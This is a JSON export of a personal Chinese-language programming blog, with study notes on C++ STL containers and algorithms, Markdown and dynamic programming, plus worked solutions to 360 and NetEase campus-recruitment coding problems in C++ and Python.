{"pages":[{"title":"Categories","date":"2018-02-19T04:21:50.522Z","path":"categories/index.html","text":""},{"title":"About","date":"2018-02-19T04:21:50.509Z","path":"about/index.html","text":""},{"title":"Tags","date":"2018-02-19T04:21:50.545Z","path":"tags/index.html","text":""}],"posts":[{"title":"STL速记——对string的各种操作","date":"2018-04-18T13:04:12.000Z","path":"wiki/STL/TL速记——对string的各种操作/","text":"（1）大小写转换 （2）查找子字符串 （3）子字符串前后数量 （4）大小写字符数量","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"STL速记——upper_bound()和lower_bound()","date":"2018-04-16T14:15:55.000Z","path":"wiki/STL/STL速记——upper-bound-和lower-bound/","text":"首先，最形象的一句话： upper_bound（i） 返回的是键值为i的元素可以插入的最后一个位置（上界） 。 lowe_bound（i） 返回的是键值为i的元素可以插入的位置的第一个位置（下界）。 怎么理解呢，举例： 在升序的set里面 set里没有元素i的时候，两个元素的返回值是一样的。 1 2 4 5 这个序列，upp（3）和low（3）都返回位置2（下标） 如果只有一个元素i，low返回那个元素的位置，而upp返回那个元素的位置的后一个位置。 1 2 4 5 这个序列upp（2）返回下标2而low（2）返回下标1 多个元素i，low返回那个元素的位置，upp返回那多个元素中的最后一个的后一个位置。 1 2 2 4 5 这个序列 upp（2）返回下标3的位置，low（2）返回下标1的位置。 ！！！！！！！！！！！！！ 特别注意：举例在一个升序的容器里，如果所有元素都大于i则，upp和low都返回begin。都小于i则返回end（越界了）。 最后再来一句，看是否好理解一些。 terator lower_bound( const key_type &amp;key ): 返回一个迭代器，指向键值&gt;= key的第一个元素。 iterator upper_bound( const key_type &amp;key ):返回一个迭代器，指向键值&lt;=key的最后一个元素的后一个元素。 ★降序排列的容器： iterator lower_bound( const key_type &amp;key ): 返回一个迭代器，指向键值&lt;= key的第一个元素。 iterator upper_bound( const key_type &amp;key ):返回一个迭代器，指向键值&gt;=key的最后一个元素的后一个元素。","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"Markdown常用命令速记","date":"2018-04-16T07:15:39.000Z","path":"wiki/便签-Cheat Sheet/Markdown/arkdown常用命令速记/","text":"（1）设置图像大小 &lt;img src=&quot;/images/pasted-27.png&quot; width=&quot;30%&quot; height=&quot;30%&quot;&gt;","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Markdown","slug":"便签-Cheat-Sheet/Markdown","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Markdown/"}]},{"title":"STL速记——map","date":"2018-04-08T13:25:55.000Z","path":"wiki/STL/TL速记——map/","text":"map的性质（1）一一映射，不能重复。 （2）数据有序：自动升序排序。（map内部自建一颗红黑树，这颗树具有对数据自动排序的功能，所以在map内部所有的数据都是有序的） map的插入map键都是唯一的，如果插入相同的key, mapObj.insert()不会覆盖原来的键值，mapObj[]会覆盖键值。 几种插入方法： （1）insert() + make_pair()【insert()不覆盖】 12std::map&lt;int, int&gt; mapObj; mapObj.insert(std::make_pair(0, 100)); （2）insert() + pair&lt;,&gt;(,)【insert()不覆盖】 12map&lt;unsigned int, string&gt; Student; Student.insert(pair&lt;unsigned int, string&gt;(1, &quot;CJY&quot;)); (3)下标键值插入Obj[1] = “OQQ”;12map&lt;unsigned int, string&gt; Student; Student[1] = &quot;OQQ&quot;; 是否插入成功： 1234567891011map&lt;int, string&gt; mapStudent;pair&lt;map&lt;int, string&gt;::iterator, bool&gt; Insert_Pair;Insert_Pair ＝ mapStudent.insert(pair&lt;int, string&gt;(1, “student_one”));if(Insert_Pair.second == true)&#123; cout&lt;&lt;”Insert Successfully”&lt;&lt;endl;&#125; else&#123; cout&lt;&lt;”Insert Failure”&lt;&lt;endl;&#125; map的取值（1）数组： Obj[1] (2)迭代器 iter-&gt;first //读key iter-&gt;second //读value map的迭代（1）正向迭代 1234for ( m1_Iter = m1.begin( ); m1_Iter != m1.end( ); m1_Iter++ )cout &lt;&lt; &quot; &quot; &lt;&lt; m1_Iter -&gt; second;cout &lt;&lt; &quot;.&quot; &lt;&lt; endl;&#125; （2）反向迭代 1234for(iter = mapStudent.rbegin(); iter != mapStudent.rend(); iter++)&#123; cout&lt;&lt;iter-&gt;first&lt;&lt;” ”&lt;&lt;iter-&gt;second&lt;&lt;end;&#125; （3）数组的迭代 12345for(int nIndex = 0; nIndex &lt; mapStudent.size(); nIndex++)&#123; cout&lt;&lt;mapStudent[nIndex]&lt;&lt;end;&#125; map的查找（1）count(): 返回0 -&gt; 存在；返回1 -&gt; 不存在； （2）find(): 用find函数来定位数据出现位置，它返回的一个迭代器，当数据出现时，它返回数据所在位置的迭代器，如果map中没有要查找的数据，它返回的迭代器等于end函数返回的迭代器 1234567891011map&lt;int, string&gt; mapStudent;map&lt;int, string&gt;::iterator iter;iter = mapStudent.find(1);if(iter != mapStudent.end())&#123; cout&lt;&lt;”Find, the value is ”&lt;&lt;iter-&gt;second&lt;&lt;endl;&#125;else&#123; cout&lt;&lt;”Do not Find”&lt;&lt;endl;&#125;","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"360 2017年春招——分金子","date":"2018-04-04T14:18:52.000Z","path":"wiki/Online Judge/360笔试题——2017年春招/","text":"分金子A、B两伙马贼意外地在一片沙漠中发现了一处金矿，双方都想独占金矿，但各自的实力都不足以吞下对方，经过谈判后，双方同意用一个公平的方式来处理这片金矿。处理的规则如下：他们把整个金矿分成n段，由A、B开始轮流从最左端或最右端占据一段，直到分完为止。 马贼A想提前知道他们能分到多少金子，因此请你帮忙计算他们最后各自拥有多少金子?（两伙马贼均会采取对己方有利的策略） 输入 测试数据包含多组输入数据。输入数据的第一行为一个正整数T(T&lt;=20)，表示测试数据的组数。然后是T组测试数据，每组测试数据的第一行包含一个整数n，下一行包含n个数（n &lt;= 500 ），表示每段金矿的含金量，保证其数值大小不超过1000。 样例输入 2 6 4 7 2 9 5 2 10 140 649 340 982 105 86 56 610 340 879 输出 对于每一组测试数据，输出一行&quot;Case #id: sc1 sc2&quot;，表示第id组数据时马贼A分到金子数量为sc1，马贼B分到金子数量为sc2。详见样例。 样例输出 Case #1: 18 11 Case #2: 3206 981 时间限制 C/C++语言：1000MS 其他语言：3000MS 内存限制 C/C++语言：65536KB 其他语言：589824KB 解题笔记： 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdlib.h&gt;#include &lt;cstdio&gt;int min(int a, int b)&#123; if(a&lt;b) &#123; return a; &#125; else &#123; return b; &#125;&#125;int sum_i_j(int a[],int i,int j)&#123; int sum = 0; int m =i; while(m&lt;=j) &#123; sum = sum + a[m]; m++; &#125; return sum;&#125;int max_a(int a[],int size)&#123; int res = 0; int array2D[505][505] = &#123;0&#125;; for (int i=0;i&lt;size;i++) &#123; array2D[i][i]=a[i]; &#125; for (int i=1;i&lt;size;i++) &#123; for (int j=0;j&lt;size;j++) &#123; int sum = 0; sum = sum_i_j(a,j,i+j); array2D[j][i+j] = sum-min(array2D[j+1][i+j],array2D[j][i+j-1]); &#125; &#125; res = array2D[0][size-1]; return res;&#125;int main ()&#123; int n = 0; scanf(&quot;%d&quot;,&amp;n); for (int i=0;i&lt;n;i++) &#123; int m = 0; scanf(&quot;%d&quot;,&amp;m); int a[505] = &#123;0&#125;; for(int j = 0; j&lt;m;j++) &#123; scanf(&quot;%d&quot;,&amp;a[j]); &#125; int a_max = max_a(a,m); int b_max = sum_i_j(a,0,m)-a_max; printf(&quot;Case #%d: %d %d\\n&quot;,i+1,a_max,b_max); &#125; return 0;&#125;","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"360 2018年春招——交易、赛马、玫瑰花","date":"2018-04-04T14:05:39.000Z","path":"wiki/Online Judge/0笔试题：2018年春招/","text":"题目一交易 题目描述 茉莉发起了一场交易，她将她的5个朋友聚在一起准备进行一场交易。交易开始前，大家各有b(b&gt;0)个硬币，交易后，每个人有ai个硬币。由于硬币不方便携带，在交易过程中可能丢失。现在茉莉想知道是否一定会丢失硬币，或者在可能没有丢失硬币的情况下，交易前每个人的硬币数b。茉莉只是组织者，不参与交易。 输入 第一行一个数T(T&lt;=100)，表示数据组数。 对于每组数据，第一行5个整数，第i个整数ai表示交易后第i个朋友的硬币数。（0&lt;=ai&lt;=100） 输出 对于每组数据，输出一行，若一定丢失硬币则输出-1，若尽可能没有丢失，则输出b。 样例输入 2 2 5 4 0 4 4 5 9 2 1 样例输出 3 -1 思路 看起来只要每行加起来模5等于0就没有丢失，比如第一行加起来是15，除以5等于3，第二行加起来是21，除以5除不尽，所以输出-1. 注意要考虑全0的情况，全0模5也是0，但是因为b&gt;0，现在全0了，说明一定发生了丢失，所以不能输出0，而应该输出-1. AC 90% 的代码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int a[5] = &#123; 0 &#125;; int sum = 0; for (int j = 0; j&lt;5; j++) &#123; scanf(&quot;%d&quot;, &amp;a[j]); sum = sum + a[j]; &#125; if (sum % 5 == 0) &#123; int ans = 0; ans = sum / 5; printf(&quot;%d\\n&quot;, ans); &#125; else &#123; printf(&quot;%d\\n&quot;, -1); &#125; &#125; return 0;&#125; 现在分析，应该是没有考虑全0的情况 修改后的代码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int a[5] = &#123; 0 &#125;; int sum = 0; for (int j = 0; j&lt;5; j++) &#123; scanf(&quot;%d&quot;, &amp;a[j]); sum = sum + a[j]; &#125; if (sum == 0) &#123; printf(&quot;-1\\n&quot;); break; &#125; if (sum % 5 == 0) &#123; int ans = 0; ans = sum / 5; printf(&quot;%d\\n&quot;, ans); &#125; else &#123; printf(&quot;%d\\n&quot;, -1); &#125; &#125; return 0;&#125; 题目二赛马 题目描述 茉莉有2n匹马，每匹马都有一个速度v，现在茉莉将马分为两个队伍，每个队伍各有n匹马，两个队之间进行n场比赛，每场比赛两队各派出一匹马参赛，每匹马都恰好出场一次。茉莉想知道是否存在一种分配队伍的方法使得无论怎么安排比赛，第一个队伍都一定能获的全胜，两匹马若速度一样，那么速度快的获胜，若速度一样，则都有可能获胜。 输入 第一行一个数T(T&lt;=100)，表示数据组数。 对于每组数据，第一行一个整数n，(1&lt;=n&lt;=100) 接下来一行，2n个整数，第i个整数vi表示第i匹马的速度（1&lt;=vi&lt;=1000） 输出 对于每组数据，输出一行，若存在一种分配方法使得第一个队伍全胜输出YES，否则输出NO 样例输入 2 2 1 2 3 4 1 1 1 样例输出 YES NO 思路： 先将数组排序，分成两半（各n），若左边最后一个元素小于右边第一个元素，就能保证不管怎么比赛都能全胜。 基于vector的代码： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int k = 0; scanf(&quot;%d&quot;, &amp;k); vector &lt;int&gt; a; int num = pow(2,k); for (int j = 0; j&lt;num; j++) &#123; int input = 0; scanf(&quot;%d&quot;, &amp;input); a.push_back(input); &#125; sort(a.begin(), a.end()); //找到中点 int k1 = a.size() / 2; if (a.at(k1 - 1) &lt; a.at(k1)) &#123; printf(&quot;YES\\n&quot;); &#125; else &#123; printf(&quot;NO\\n&quot;); &#125; &#125; return 0;&#125; 玫瑰花题目描述 有K种不同的玫瑰花，现在要摆放在N各位置，要求每种颜色的花至少出现过一次，请问有多少种不同的方案数呢？因为答案可能很大，你需要输出它对772235取余后的结果。 输入 输入只有1行，分别有两个整数N，K（1&lt;=N&lt;=50000，1&lt;=K&lt;=30） 输出 输出一行表示答案 样例输入 3 2 样例输出 6 题目分析： C++动态分配二维数组： 12345678 int row = 0;int col = 0;scanf(&quot;%d %d&quot;,)int** array = new int*[row];for (int i = 0; i&lt;row; i++)&#123; array[i] = new int[col];&#125; C++释放动态分配的二维数组： 12345678 int row = 0;int col = 0;scanf(&quot;%d %d&quot;,)int** array = new int*[row];for (int i = 0; i&lt;row; i++)&#123; array[i] = new int[col];&#125; 12345for(int i=0; i&lt;row; i++) &#123; delete[] array[i]; &#125; delete[] array; 整体代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;vector&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int N = 0; int K = 0; scanf(&quot;%d %d&quot;, &amp;N, &amp;K); if (N &lt; K) &#123; printf(&quot;%d\\n&quot;, 0); &#125; else &#123; if (N == K) &#123; int res = 1; for (int j = K; j &gt; 0; j--) &#123; res = res*j; &#125; printf(&quot;%d\\n&quot;, res); &#125; else &#123; int** DP = new int*[N+1]; for (int i = 0; i&lt;=N; i++) &#123; DP[i] = new int[2]; &#125; for (int i = 0; i&lt;=N; i++) DP[i][0] = 0; DP[0][1] = 0; for (int k = 1; k&lt;=K; k++) &#123; //确定递推开始的“头部” int res = 1; for (int j = k; j &gt; 0; j--) &#123; res = res*j; &#125; DP[k][k % 2] = res; for (int n = k + 1; n&lt;=N; n++) &#123; if ((k % 2) == 1) &#123;//此时i是奇数 DP[n][1] = k*(DP[n - 1][1] + DP[n - 1][0]); //printf(&quot;%d&quot;,DP[n][1]); &#125; else &#123; DP[n][0] = k*(DP[n - 1][0] + DP[n - 1][1]); //printf(&quot;%d&quot;, DP[n][0]); &#125; //printf(&quot;End of loop %d&quot;, n); &#125; &#125; printf(&quot;%d\\n&quot;,DP[N][K%2]); for (int i = 0; i&lt;=N; i++) &#123; delete[] DP[i]; &#125; delete[] DP; &#125; &#125; return 0;&#125; 注意：这个表格是[0,N]和[0,K]，共N+1行，K+1列，所以分配内存的时候要分配N+1和K+1，循环里要用&lt;=","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"STL速记——sort()","date":"2018-04-04T13:23:01.000Z","path":"wiki/STL/TL速记——sort/","text":"代码示例1： sort()对数组排序。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include&lt;algorithm&gt;using namespace std;bool cmp_less(int i, int j)&#123; return (i &lt; j);&#125;bool cmp_greater(int i, int j)&#123; return (i &gt; j);&#125;int main()&#123; int a[100] = &#123; 0 &#125;; for (int i = 0; i &lt; 100; i++) &#123; if (i &lt; 10) &#123; a[i] = 5; &#125; else &#123; a[i] = 100 - i; &#125; &#125; sort(a, a + 100, cmp_less); sort(a, a + 100, cmp_greater); for (int i = 0; i &lt; 100; i++) &#123; printf(&quot;%d &quot;, a[i]); &#125; return 0;&#125; 代码示例2： sort()对vector排序。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;using namespace std;#include&lt;algorithm&gt;bool cmp_less(int i, int j)&#123; return (i &lt; j);&#125;bool cmp_greater(int i, int j)&#123; return (i &gt; j);&#125;int main()&#123; vector &lt;int&gt; a; for (int i = 0; i &lt; 100; i++) &#123; if (i &lt; 10) &#123; a.push_back(5); &#125; else &#123; a.push_back(100 - i); &#125; &#125; sort(a.begin(), a.end(), cmp_less); sort(a.begin(), a.end(), cmp_greater); for (int i = 0; i &lt; 100; i++) &#123; printf(&quot;%d &quot;, a[i]); &#125; return 0;&#125;","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"STL速记——vector","date":"2018-04-04T07:57:30.000Z","path":"wiki/STL/TL速记——vector/","text":"一、vector是“动态数组” vector收录在STL里，是一种特殊的数据结构。它的中文名字叫做“动态数组”或者“不定长数组”，有时也被翻译成“容器”。 说白了，vector就是一个功能强大的数组。下面让我们来体验它强大的功能吧！ 二、vector的头文件 vector收录在std库里，所以调用vector需要 #include&lt;vector&gt; using namespace std; 这两个头文件。 三、vector的声明与构造函数 既然是“动态数组”，vector是一个什么数组呢，int？double？或者结构体数组？ 我们可以这样声明一个vector： vector &lt;数据类型&gt; 动态数组名; 比如： vector &lt;int&gt; i;//一个int的动态数组 vector &lt;char&gt; c;//一个char的动态数组 vector &lt;node&gt; n;//一个node的动态数组（node是结构体名） 如果你想赋初值，你可以： vector &lt;int&gt; M(a,b);//在M里装a个b vector &lt;int&gt; N(a); //在N里装a个0 当然你也可以： vector &lt;int&gt; A; vector &lt;int&gt; B(A);//一个和A一模一样的动态数组 vector &lt;int&gt; C(B.begin()+l,B.end()-r);//继承B动态数组下标[l,B.end()-r)的值，注意，下标从0开始，begin()，end()，size()三个函数见下文 四、vector的析构函数 很简单，你可以vector &lt;A&gt; B;//A是某种数据结构，B是动态数组名 如果你想析构它，只需调用B.~vector&lt;A&gt;(); 即可。 也就是说，vector的析构函数是：动态数组名.~vector&lt;该数组的数据结构&gt;(); vector似乎一般不用手动调用析构函数。 五、vector的基本操作 以vector &lt;int&gt; v为例： ① v[i]或v.at(i)//返回v[i]的值 ② v.size();//返回v数组元素总个数 ③ v.front();//返回v数组第一个元素的值 ④ v.back();//返回v数组最后一个元素的值 ⑤ v.clear();//清空v数组 ⑥ v.begin();//返回v数组第一个数的下标 ⑦ v.end();//返回v数组最后一个数的下标 ⑧ v.empty();//判断v数组是否为空，是空则返回1(true)，非空（有元素）则返回0(false) ⑨ v.swap(v1);//v1是另一个动态数组，将v和v1元素互换 ⑩ swap(v,v1);//同⑨ 注意：再次重申，vector的下标是从0开始的！ 注意：除v[i]外，其余都是vector的自带函数，因此必须添上括号！ 五、vector的插入 std库提供了好几种插入，这里讲最为常用的三种。 ① v.push_back(a);//在v数组的尾部插入数a 比如： 有一个动态数组x:2017 2333 调用x.push_back(666); 则x:2017 2333 666 ② v.insert(v.begin()+k,a);//在下标k的前面插入数a，k之后的数依次后退一位 //记住，下标是从0开始的！ 比如： 动态数组x:1 2 3 4 5 6 调用x.insert(x.begin()+2,100); 则x:1 2 100 3 4 5 6 ③ x.insert(x.begin()+k,p,a);//在下标k前面插入p个a 注意！下面的写法是错的： 六、vector的删除 也有三种， ① v.pop_back()//删除最后一个元素 ② v.erase(v.begin()+k);//删除下标为k的数，返回下一个位置的下标 ③ v.erase(v.begin()+l,v.end()-r);//删除下标[l,v.end()-r)的元素 用动态数组vector解决360 2018年春招笔试题“赛马”： 问题 题目五 赛马 题目描述 茉莉有2n匹马，每匹马都有一个速度v，现在茉莉将马分为两个队伍，每个队伍各有n匹马，两个队之间进行n场比赛，每场比赛两队各派出一匹马参赛，每匹马都恰好出场一次。茉莉想知道是否存在一种分配队伍的方法使得无论怎么安排比赛，第一个队伍都一定能获的全胜，两匹马若速度一样，那么速度快的获胜，若速度一样，则都有可能获胜。 输入 第一行一个数T(T&lt;=100)，表示数据组数。 对于每组数据，第一行一个整数n，(1&lt;=n&lt;=100) 接下来一行，2n个整数，第i个整数vi表示第i匹马的速度（1&lt;=vi&lt;=1000） 输出 对于每组数据，输出一行，若存在一种分配方法使得第一个队伍全胜输出YES，否则输出NO 样例输入 2 2 1 2 3 4 1 1 1 样例输出 YES NO 思路： 先将数组排序，分成两半（各n），若左边最后一个元素小于右边第一个元素，就能保证不管怎么比赛都能全胜。 基于vector的代码： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int k = 0; scanf(&quot;%d&quot;, &amp;k); vector &lt;int&gt; a; int num = pow(2,k); for (int j = 0; j&lt;num; j++) &#123; int input = 0; scanf(&quot;%d&quot;, &amp;input); a.push_back(input); &#125; sort(a.begin(), a.end()); //找到中点 int k1 = a.size() / 2; if (a.at(k1 - 1) &lt; a.at(k1)) &#123; printf(&quot;YES\\n&quot;); &#125; else &#123; printf(&quot;NO\\n&quot;); &#125; &#125; return 0;&#125;","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"STL速记——总纲","date":"2018-04-04T03:19:45.000Z","path":"wiki/STL/L速记/","text":"（1）13个头文件 （2）底层实现 1.vector 底层数据结构为数组 ，支持快速随机访问 2.list 底层数据结构为双向链表，支持快速增删 3.deque 底层数据结构为一个中央控制器和多个缓冲区，详细见STL源码剖析P146，支持首尾（中间不能）快速增删，也支持随机访问 4.stack 底层一般用23实现，封闭头部即可，不用vector的原因应该是容量大小有限制，扩容耗时 5.queue 底层一般用23实现，封闭头部即可，不用vector的原因应该是容量大小有限制，扩容耗时 6.45是适配器,而不叫容器，因为是对容器的再封装 7.priority_queue 的底层数据结构一般为vector为底层容器，堆heap为处理规则来管理底层容器实现 8.set 底层数据结构为红黑树，有序，不重复 9.multiset 底层数据结构为红黑树，有序，可重复 10.map 底层数据结构为红黑树，有序，不重复 11.multimap 底层数据结构为红黑树，有序，可重复 12.hash_set 底层数据结构为hash表，无序，不重复 13.hash_multiset 底层数据结构为hash表，无序，可重复 14.hash_map 底层数据结构为hash表，无序，不重复 15.hash_multimap 底层数据结构为hash表，无序，可重复 （3）","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"动态规划学习笔记——Notes on Dynamic Programming","date":"2018-03-31T13:51:52.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/动态规划-Dynamic Programming/态规划——Dynamic-Programming/","text":"首先学习了这篇文章： 漫画：什么是动态规划？ https://zhuanlan.zhihu.com/p/31628866 以下是这篇文章的笔记： 【1】走楼梯-笔记 【2】走楼梯-代码 所以一个问题是该用递推、贪心、搜索还是动态规划，完全是由这个问题本身阶段间状态的转移方式决定的！ 每个阶段只有一个状态-&gt;递推； 每个阶段的最优状态都是由上一个阶段的最优状态得到的-&gt;贪心； 每个阶段的最优状态是由之前所有阶段的状态的组合得到的-&gt;搜索； 每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到而不管之前这个状态是如何得到的-&gt;动态规划。 每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到这个性质叫做最优子结构；而不管之前这个状态是如何得到的这个性质叫做无后效性。 参考资料：王勐：https://www.zhihu.com/question/23995189/answer/35429905","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"动态规划-Dynamic Programming","slug":"数据结构与算法-Data-Structure-and-Algorithm/动态规划-Dynamic-Programming","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/动态规划-Dynamic-Programming/"}]},{"title":"网易2018春招——牛牛找工作","date":"2018-03-30T12:29:48.000Z","path":"wiki/Online Judge/易2018春招——牛牛找工作/","text":"[编程题] 牛牛找工作 时间限制：2秒 空间限制：65536K 为了找到自己满意的工作，牛牛收集了每种工作的难度和报酬。牛牛选工作的标准是在难度不超过自身能力值的情况下，牛牛选择报酬最高的工作。在牛牛选定了自己的工作后，牛牛的小伙伴们来找牛牛帮忙选工作，牛牛依然使用自己的标准来帮助小伙伴们。牛牛的小伙伴太多了，于是他只好把这个任务交给了你。 输入描述: 每个输入包含一个测试用例。 每个测试用例的第一行包含两个正整数，分别表示工作的数量N(N&lt;=100000)和小伙伴的数量M(M&lt;=100000)。 接下来的N行每行包含两个正整数，分别表示该项工作的难度Di(Di&lt;=1000000000)和报酬Pi(Pi&lt;=1000000000)。 接下来的一行包含M个正整数，分别表示M个小伙伴的能力值Ai(Ai&lt;=1000000000)。 保证不存在两项工作的报酬相同。 输出描述: 对于每个小伙伴，在单独的一行输出一个正整数表示他能得到的最高报酬。一个工作可以被多个人选择。 输入例子1: 3 3 1 100 10 1000 1000000000 1001 9 10 1000000000 输出例子1: 100 1000 1001 1234567891011121314151617181920import sysif __name__ == &quot;__main__&quot;: line = sys.stdin.readline().strip() values = list(map(int, line.split())) N = values[0] M = values[1] D_P = [] for i in range(N): line = sys.stdin.readline().strip() D_i_P_i = list(map(int,line.split())) D_P.append(D_i_P_i) line = sys.stdin.readline().strip() A = list(map(int, line.split())) for each_a in A: salary_res = 0 for D_i_P_i in D_P: if each_a &gt;= D_i_P_i[0]: if salary_res &lt; D_i_P_i[1]: salary_res = D_i_P_i[1] print(salary_res) 简单分析一下，应该不是超内存了： 65535000B 8191875个int 200000个int 查到是输入空行的问题： 1234567891011121314151617181920212223242526import sysif __name__ == &quot;__main__&quot;: line = sys.stdin.readline().strip() while line == &quot;&quot;: line = sys.stdin.readline().strip() values = list(map(int, line.split())) N = values[0] M = values[1] D_P = [] for i in range(N): line = sys.stdin.readline().strip() while line == &quot;&quot;: line = sys.stdin.readline().strip() D_i_P_i = list(map(int,line.split())) D_P.append(D_i_P_i) line = sys.stdin.readline().strip() while line == &quot;&quot;: line = sys.stdin.readline().strip() A = list(map(int, line.split())) for each_a in A: salary_res = 0 for D_i_P_i in D_P: if each_a &gt;= D_i_P_i[0]: if salary_res &lt; D_i_P_i[1]: salary_res = D_i_P_i[1] print(salary_res) 这回超时了： 这个方法的时间复杂度：O(N*M) 这种“暴力枚举”并不可靠，优化一下思路。 一个比较好的思路是构建一张表，将难度与报酬一一对应。给一个难度，查表即可得到报酬的数值。 一个思维的盲点在于：虽然有1000000000种难度，但并不真的需要构建a[1000000000].因为真正需要考虑的，最多只有N+M种（N种工作的难度值+M和学生的能力值）情况。 使用STL map和upper_bound()的思路如下： 完整代码如下： 123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;map&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int n, m; cin &gt;&gt; n &gt;&gt; m; if (n &lt; 0 || n &gt;100000 || m &lt; 0 || m &gt; 100000) return 0; map&lt;int, int&gt; aMap; for (int i = 0; i &lt; n; i++) &#123; int d, p; cin &gt;&gt; d &gt;&gt; p; aMap[d] = aMap[d] == 0 ? p : max(aMap[d], p); &#125; int temp = 0; auto iter = aMap.begin(); for (; iter != aMap.end(); iter++) &#123; temp = max(temp, iter-&gt;second); iter-&gt;second = temp; &#125; for (int i = 0; i &lt; m; i++) &#123; int res = 0; int a; cin &gt;&gt; a; iter = aMap.upper_bound(a); iter--; res = iter-&gt;second; cout &lt;&lt; res &lt;&lt; endl; &#125; return 0;&#125;","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"网易2018春招——牛牛的闹钟","date":"2018-03-30T03:30:24.000Z","path":"wiki/Online Judge/2018春招——牛牛的闹钟/","text":"[编程题] 牛牛的闹钟时间限制：1秒 空间限制：32768K 牛牛总是睡过头，所以他定了很多闹钟，只有在闹钟响的时候他才会醒过来并且决定起不起床。从他起床算起他需要X分钟到达教室，上课时间为当天的A时B分，请问他最晚可以什么时间起床 输入描述: 每个输入包含一个测试用例。 每个测试用例的第一行包含一个正整数，表示闹钟的数量N(N&lt;=100)。 接下来的N行每行包含两个整数，表示这个闹钟响起的时间为Hi(0&lt;=A&lt;24)时Mi(0&lt;=B&lt;60)分。 接下来的一行包含一个整数，表示从起床算起他需要X(0&lt;=X&lt;=100)分钟到达教室。 接下来的一行包含两个整数，表示上课时间为A(0&lt;=A&lt;24)时B(0&lt;=B&lt;60)分。 数据保证至少有一个闹钟可以让牛牛及时到达教室。 输出描述: 输出两个整数表示牛牛最晚起床时间。 输入例子1: 3 5 0 6 0 7 0 59 6 59 输出例子1: 6 0 第一版本的代码： 123456789101112131415161718192021222324252627282930313233343536373839import sysdef time_to_minutes(A, B): minutes = A*60 + B return minutesdef is_this_enough(clock, class_time, on_the_way): if clock + on_the_way &lt;= class_time: return True else: return Falseif __name__ == &quot;__main__&quot;: n = int(sys.stdin.readline().strip()) ans = 0 clock = [] results = [] for i in range(n): line = sys.stdin.readline().strip() values = list(map(int,line.split())) results.append(line) A = values[0] B = values[1] # for v in values: # ans += v clock.append(time_to_minutes(A,B)) X = int(sys.stdin.readline().strip()) line_2 = sys.stdin.readline().strip() values = list(map(int, line_2.split())) class_time = time_to_minutes(values[0], values[1]) ans_ptr = 0 count = 0 for each_clock in clock: if is_this_enough(each_clock,class_time,X): ans_ptr = count count = count + 1 print(results[ans_ptr]) 这段代码的问题是： 输入不一定是有顺序的！！！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394您的代码已保存答案错误:您提交的程序没有通过所有的测试用例case通过率为30.00%测试用例:780 07 72 116 4011 16 2212 2421 100 2618 3317 2019 62 2418 4723 5118 5517 918 426 4419 170 121 354 315 2415 2122 144 4213 2917 236 5919 338 4022 562 5018 77 810 332 5223 2719 4720 3418 203 84 231 105 1113 55 4522 213 4022 423 101 94 4419 532 2917 3114 3514 260 359 5821 3413 1115 2710 5811 1410 4016 26 712 401 573 05 62 713 5116 373 396 366517 17对应输出应该为:16 2你的输出为:6 36 只要考虑到这一点，就AC了。。。我真是太菜了（逃 12345678910111213141516171819202122232425262728293031323334353637383940import sysdef time_to_minutes(A, B): minutes = A*60 + B return minutesdef is_this_enough(clock, class_time, on_the_way): if clock + on_the_way &lt;= class_time: return True else: return Falseif __name__ == &quot;__main__&quot;: n = int(sys.stdin.readline().strip()) ans = 0 clock = [] results = [] for i in range(n): line = sys.stdin.readline().strip() values = list(map(int,line.split())) results.append(line) A = values[0] B = 